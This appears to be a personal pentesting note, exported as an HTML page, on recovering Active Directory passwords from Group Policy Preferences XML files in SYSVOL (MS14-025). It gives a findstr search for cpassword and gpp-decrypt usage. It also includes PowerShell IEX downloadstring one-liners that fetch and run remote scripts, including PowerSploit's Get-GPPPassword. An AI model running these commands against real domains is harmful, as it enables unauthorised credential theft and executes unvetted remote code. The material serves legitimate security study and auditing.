<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Finding Passwords in SYSVOL and Exploiting Group Policy Preferences</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Finding Passwords in SYSVOL and Exploiting Group Policy Preferences</h1>
    <br /><br /><strong>Potentially Vulnerable Systems</strong><br />All the OSs before Windows Server 2012 R2 and
    Windows 8.1.<br />The Vulnerability is been patched with <a
      href="https://support.microsoft.com/en-us/topic/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevation-of-privilege-may-13-2014-60734e15-af79-26ca-ea53-8cd617073c30" target="_blank">MS14-025</a><br /><br /><strong>Group
      Policy Preferences (GPP)</strong><br />With Windows Server 2009 Microsoft released “Group Policy Preferences
    (GPP)”.<br />Group Policy Preferences (GPP) have some interesting features like:<br /> ◇ Scheduled Tasks
    (ScheduledTasks.xml)<br /> scheduled tasks that can contain explicit credentials<br /> ◇ Change local Administrator
    passwords<br /> change the local admin passwords on large numbers of computers at once. To do that see<br /> Domain
    Controller → Server Manager → Tools → Group Policy Management → Default Domain Policy (right click and edit) →
    Computer Configuration → Preferences → Control Panel Settings → Local Users and Groups(right click and New → Local
    User) → <br /> Action:Update; User name: Administrator(built-in); Password:&lt;your-choice&gt;<strong><br />
    </strong><a href=""><img src="images/1215-1.png" alt="images/1215-1.png" /></a><br /><br />SYSVOL<br />SYSVOL is the
    the share in the Active Directory to which all authenticated users have read access. <br />All domain Group Policies
    are stored here: <br />
    <div class="codebox">
      <div class="codebox">\\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</div>
    </div><br />SYSVOL is readable by all users because Group Policies Preferences need to be automatically synchronized
    and shared among all Domain Controllers.<br /><br /><strong>What happen when Group Policy Preference is
      created?</strong><br />When a new GPP is created, there’s an associated XML file created in SYSVOL with the
    relevant configuration data.<br />If in this XML file there is a password, it is AES-256 bit encrypted which should
    be good enough…Except at some point prior to 2012, <a
      href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN" target="_blank">Microsoft
      published the AES private key on MSDN</a> which can be used to decrypt the password. <br />Since authenticated
    users (any domain user or users in the Domain) like we have already told before have read access to SYSVOL, anyone
    in the domain can search the SYSVOL share for XML files containing “cpassword” which is the value that contains the
    AES encrypted password.<br /> <a href=""><img src="images/1215-2.png" alt="images/1215-2.png" /></a><br />
    <br /><strong>Exploiting Group Policy Preferences</strong><br />• To find the <span
      style="color:#ff0000;">encrypted</span> password with the built in commands of Powershell<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;findstr&nbsp;/S&nbsp;/I&nbsp;cpassword&nbsp;\\&lt;FQDN&gt;\sysvol\&lt;FQDN&gt;\policies\*.xml</div>
    </div><br /> /S → recursive search in subdirectories<br /> /I → case insensitive<br /> <a href=""><img
        src="images/1215-3.png" alt="images/1215-3.png" /></a><br /> Then we can <span style="color:#ff8700;">decrypt
      it</span> in another machine with a script<br /> ◇ Windows<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/DenFox93/DecryptedCpassword/main/Get-DecryptedCpassword.ps1&#39;);&nbsp;Get-DecryptedCpassword&nbsp;-Cpassword&nbsp;&quot;VPe/o9YRyz2cksnYRbNeQpxQIjMB/W4+CjQJosyeQls&quot;
      </div>
    </div><br /> <a href=""><img src="images/1215-4.png" alt="images/1215-4.png" /></a><br /> ◇ Linux<br />
    <div class="codebox">
      <div class="codebox">kali@kali:~$&nbsp;gpp-decrypt&nbsp;VPe/o9YRyz2cksnYRbNeQpxQIjMB/W4+CjQJosyeQls</div>
    </div><br /> <a href=""><img src="images/1215-5.png" alt="images/1215-5.png" /></a><br />• Get-GPPPassword.ps1 of
    PowershellMafia will search for the <span style="color:#ff0000;">encrypted password</span> and <span
      style="color:#ff8700;">decrypt it</span> all-in-one.<br /> -server → is possible specify the domain controller to
    search for. By the default this option is set to the to the users current domain<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1&nbsp;&#39;);&nbsp;Get-GPPPassword&nbsp;-server&nbsp;daniele.local
      </div>
    </div><br /> <a href=""><img src="images/1215-6.png"
        alt="images/1215-6.png" /></a><br /><br /><br />Bibliography:<br />• <a
      href="https://adsecurity.org/?p=2288" target="_blank">Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences –
      Active Directory Security (adsecurity.org)</a>
  </div>
</body>

</html>